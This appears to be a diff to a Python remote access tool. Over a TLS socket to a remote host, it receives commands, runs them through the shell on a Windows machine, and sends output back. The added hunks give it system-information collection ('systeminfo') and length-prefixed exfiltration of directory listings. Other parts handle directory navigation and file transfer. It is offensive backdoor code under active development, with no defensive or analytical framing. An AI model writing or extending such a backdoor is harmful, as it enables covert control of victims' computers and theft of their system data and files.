@@ -2,9 +2,8 @@ import os
 import socket
 import ssl
 import subprocess
-import threading
 import time
-
+import struct
 
 def q(host, port):
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
@@ -32,7 +31,21 @@ def q(host, port):
 
                         elif command == "ls -la" or command == "ls":
                             itens = subprocess.check_output('dir /a', shell=True, text=True)
-                            p.sendall(itens.encode('utf-8'))
+                            itens_bytes = itens.encode('utf-8')
+                            data_length = len(itens_bytes)
+
+                            p.sendall(struct.pack('>I', data_length))
+
+                            p.sendall(itens_bytes)
+
+
+                        elif command == "sysinfo" or command == "systeminfo":
+                            itens = subprocess.check_output('systeminfo', shell=True, text=True)
+                            itens_bytes = itens.encode('utf-8')
+                            data_length = len(itens_bytes)
+
+                            p.sendall(struct.pack('>I', data_length))
+                            p.sendall(itens_bytes)
 
 
                         elif command == 'cd ..':
@@ -105,7 +118,6 @@ def q(host, port):
                                             if not data:
                                                 break
                                             file.write(data)
-                                    print(f"File {file_name} downloaded successfully!")
                                 except Exception as e:
                                     print(f"An error occurred: {e}")
                                 finally:
